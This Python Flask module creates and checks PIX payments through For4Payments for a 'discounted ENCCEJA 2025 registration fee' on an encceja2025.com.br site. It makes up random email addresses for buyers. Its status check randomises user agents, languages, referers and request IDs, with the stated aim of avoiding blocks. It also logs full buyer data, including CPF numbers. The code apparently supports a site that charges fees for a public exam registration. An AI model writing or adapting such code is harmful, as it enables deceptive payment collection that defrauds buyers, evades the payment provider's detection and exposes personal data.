import os
import requests
from datetime import datetime
from flask import current_app, request
from typing import Dict, Any, Optional
import random
import string
from transaction_tracker import track_transaction_attempt, get_client_ip, is_transaction_ip_banned

class PagamentoComDescontoAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def _generate_random_email(self, name: str) -> str:
        clean_name = ''.join(e.lower() for e in name if e.isalnum())
        random_num = ''.join(random.choices(string.digits, k=4))
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        domain = random.choice(domains)
        return f"{clean_name}{random_num}@{domain}"

    def _generate_random_phone(self) -> str:
        ddd = str(random.randint(11, 99))
        number = ''.join(random.choices(string.digits, k=8))
        return f"{ddd}{number}"

    def create_pix_payment_with_discount(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Cria um pagamento PIX com desconto no valor de R$49,70
        """
        # Registro detalhado da chave secreta (parcial)
        if not self.secret_key:
            current_app.logger.error("Token de autenticação não fornecido")
            raise ValueError("Token de autenticação não foi configurado")
        elif len(self.secret_key) < 10:
            current_app.logger.error(f"Token de autenticação muito curto ({len(self.secret_key)} caracteres)")
            raise ValueError("Token de autenticação inválido (muito curto)")
        else:
            current_app.logger.info(f"Utilizando token de autenticação: {self.secret_key[:3]}...{self.secret_key[-3:]} ({len(self.secret_key)} caracteres)")
            
        # Verificar se o IP está banido por excesso de transações
        client_ip = get_client_ip()
        if is_transaction_ip_banned(client_ip):
            current_app.logger.warning(f"Bloqueando tentativa de pagamento de IP banido: {client_ip}")
            raise ValueError("Excesso de tentativas de transação detectado. Tente novamente em 24 horas.")
            
        # Verificar se este IP já fez muitas tentativas com os mesmos dados
        allowed, message = track_transaction_attempt(client_ip, data)
        if not allowed:
            current_app.logger.warning(f"Bloqueando tentativa de pagamento com desconto: {message}")
            raise ValueError(message)

        # Email é requerido pela API, gerar um baseado no nome
        email = data.get('email', self._generate_random_email(data.get('nome', '')))
        
        # Formatar o telefone (remover caracteres especiais)
        phone = data.get('telefone', '')
        phone = ''.join(filter(str.isdigit, phone))
        
        # Formatar o CPF (remover caracteres especiais)
        cpf = data.get('cpf', '').replace(".", "").replace("-", "")
        
        # Valor com desconto: R$49,70 em centavos
        amount_in_cents = 4970

        # Log dos dados básicos
        current_app.logger.info(f"Processando pagamento com desconto para CPF: {cpf[:3]}...{cpf[-2:]}")
        
        # Payload no formato correto para a API
        payment_data = {
            "name": data.get('nome', ''),
            "email": email,
            "cpf": cpf,
            "phone": phone,
            "paymentMethod": "PIX",
            "amount": amount_in_cents,
            "items": [{
                "title": "Taxa de Inscrição ENCCEJA 2025 com Desconto",
                "quantity": 1,
                "unitPrice": amount_in_cents,
                "tangible": False
            }]
        }
        
        current_app.logger.info(f"Dados de pagamento formatados: {payment_data}")
        current_app.logger.info(f"Endpoint API: {self.API_URL}/transaction.purchase")
        current_app.logger.info("Enviando requisição para API For4Payments...")
        
        try:
            response = requests.post(
                f"{self.API_URL}/transaction.purchase",
                json=payment_data,
                headers=self._get_headers(),
                timeout=30
            )
            
            current_app.logger.info(f"Resposta recebida (Status: {response.status_code})")
            current_app.logger.debug(f"Resposta completa: {response.text}")
            
            if response.status_code == 200:
                response_data = response.json()
                current_app.logger.info(f"Resposta da API: {response_data}")
                
                # Formatar a resposta no formato esperado pelo frontend
                formatted_response = {
                    'id': response_data.get('id') or response_data.get('transactionId'),
                    'pixCode': response_data.get('pixCode') or response_data.get('pix', {}).get('code'),
                    'pixQrCode': response_data.get('pixQrCode') or response_data.get('pix', {}).get('qrCode'),
                    'expiresAt': response_data.get('expiresAt') or response_data.get('expiration'),
                    'status': response_data.get('status', 'pending'),
                    'discount_applied': True,
                    'regular_price': 7340,  # R$73,40 em centavos
                    'discount_price': 4970  # R$49,70 em centavos
                }
                
                current_app.logger.info(f"Resposta formatada: {formatted_response}")
                
                # Registrar a transação bem-sucedida para controle anti-fraude
                transaction_id = formatted_response.get('id')
                if transaction_id:
                    is_allowed, message = track_transaction_attempt(get_client_ip(), data, transaction_id)
                    current_app.logger.info(f"Transação {transaction_id} registrada para rastreamento: {message}")
                
                return formatted_response
            elif response.status_code == 401:
                current_app.logger.error("Erro de autenticação com a API For4Payments")
                raise ValueError("Falha na autenticação com a API For4Payments. Verifique a chave de API.")
            else:
                error_message = 'Erro ao processar pagamento'
                try:
                    error_data = response.json()
                    if isinstance(error_data, dict):
                        error_message = error_data.get('message') or error_data.get('error') or '; '.join(error_data.get('errors', []))
                        current_app.logger.error(f"Erro da API For4Payments: {error_message}")
                except Exception as e:
                    error_message = f'Erro ao processar pagamento (Status: {response.status_code})'
                    current_app.logger.error(f"Erro ao processar resposta da API: {str(e)}")
                raise ValueError(error_message)
                
        except requests.exceptions.RequestException as e:
            current_app.logger.error(f"Erro de conexão com a API For4Payments: {str(e)}")
            raise ValueError("Erro de conexão com o serviço de pagamento. Tente novamente em alguns instantes.")
        except Exception as e:
            current_app.logger.error(f"Erro ao criar pagamento com desconto: {str(e)}")
            return {"error": str(e)}

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Verifica o status de um pagamento na API For4Payments"""
        try:
            current_app.logger.info(f"[PROD] Verificando status do pagamento {payment_id}")
            
            # Gerar headers aleatórios para evitar bloqueios
            import random
            import time
            
            # Lista de user agents para variar os headers
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
                "Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/94.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
            ]
            
            # Lista de idiomas para variar nos headers
            languages = [
                "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7",
                "es-ES,es;q=0.9,pt;q=0.8,en;q=0.7",
                "fr-FR,fr;q=0.9,en;q=0.8,pt-BR;q=0.7",
                "de-DE,de;q=0.9,en;q=0.8,pt;q=0.7"
            ]
            
            # Lista de possíveis referers para diversificar
            referers = [
                "https://encceja2025.com.br/obrigado",
                "https://encceja2025.com.br/thank_you",
                "https://encceja2025.com.br/inscricao-sucesso",
                "https://encceja2025.com.br/pagamento",
                "https://encceja2025.com.br/pagamento-desconto"
            ]
            
            # Gerar um ID único para cada requisição para evitar padrões
            unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            
            # Configurar headers extras aleatórios
            extra_headers = {
                "User-Agent": random.choice(user_agents),
                "Accept-Language": random.choice(languages),
                "Cache-Control": random.choice(["max-age=0", "no-cache"]),
                "X-Requested-With": "XMLHttpRequest",
                "X-Cache-Buster": str(int(time.time() * 1000)),
                "X-Request-ID": unique_id,
                "X-App-Version": f"encceja-{random.randint(100, 999)}",
                "Referer": random.choice(referers),
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty"
            }
            
            # Combinar com headers base
            headers = self._get_headers()
            headers.update(extra_headers)
            
            current_app.logger.info(f"Usando headers aleatórios para For4Payments API - verificação de status")
            
            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=headers,
                timeout=30
            )
            
            current_app.logger.info(f"Status check response (Status: {response.status_code})")
            current_app.logger.debug(f"Status check response body: {response.text}")
            
            if response.status_code == 200:
                payment_data = response.json()
                current_app.logger.info(f"Payment data received: {payment_data}")
                
                # Map For4Payments status to our application status
                status_mapping = {
                    'PENDING': 'pending',
                    'PROCESSING': 'pending',
                    'APPROVED': 'completed',
                    'COMPLETED': 'completed',
                    'PAID': 'completed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'CANCELED': 'cancelled',
                    'CANCELLED': 'cancelled'
                }
                
                current_status = payment_data.get('status', 'PENDING').upper()
                mapped_status = status_mapping.get(current_status, 'pending')
                
                current_app.logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")
                
                # Se o pagamento foi confirmado, registrar evento para o Facebook Pixel
                if mapped_status == 'completed':
                    current_app.logger.info(f"[FACEBOOK_PIXEL] Evento de conversão para pagamento {payment_id} - Pixel ID: 1418766538994503")
                
                return {
                    'status': mapped_status,
                    'original_status': current_status,
                    'pix_qr_code': payment_data.get('pixQrCode'),
                    'pix_code': payment_data.get('pixCode'),
                    'facebook_pixel_id': '1418766538994503' if mapped_status == 'completed' else None
                }
            elif response.status_code == 404:
                current_app.logger.warning(f"Payment {payment_id} not found")
                return {'status': 'pending', 'original_status': 'PENDING'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                current_app.logger.error(error_message)
                return {'status': 'pending', 'original_status': 'PENDING'}
                
        except Exception as e:
            current_app.logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'pending', 'original_status': 'PENDING'}

def create_payment_with_discount_api(secret_key: Optional[str] = None) -> PagamentoComDescontoAPI:
    """Factory function para criar a instância da API de pagamento com desconto"""
    # Usar a chave do ambiente ou a passada como parâmetro
    api_key = secret_key or os.environ.get("FOR4PAYMENTS_SECRET_KEY", "")
    return PagamentoComDescontoAPI(api_key)